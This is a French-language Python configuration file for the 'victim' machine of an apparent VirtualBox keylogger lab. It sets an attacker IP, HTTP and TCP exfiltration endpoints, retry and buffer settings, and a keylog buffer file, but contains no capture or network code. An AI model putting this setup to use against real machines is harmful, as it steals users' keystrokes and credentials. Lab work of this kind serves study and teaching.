"""
Configuration pour la VM Victime
Modifiez ces valeurs selon votre configuration VirtualBox
"""

# Adresse IP du serveur attaquant (à modifier selon votre configuration)
ATTACKER_IP = "192.168.56.101"
ATTACKER_PORT = 8080

# Mode d'exfiltration : "http" ou "tcp"
EXFILTRATION_MODE = "http"

# Configuration HTTP
HTTP_ENDPOINT = f"http://{ATTACKER_IP}:{ATTACKER_PORT}/logs"

# Configuration TCP
TCP_HOST = ATTACKER_IP
TCP_PORT = 9999

# Paramètres de résilience
RETRY_ATTEMPTS = 3
RETRY_DELAY = 5  # secondes
BUFFER_SIZE = 100  # Nombre de logs à garder en tampon en cas de perte réseau

# Fichier de tampon local (optionnel)
BUFFER_FILE = "keylog_buffer.json"

# Intervalle d'envoi (secondes)
SEND_INTERVAL = 2

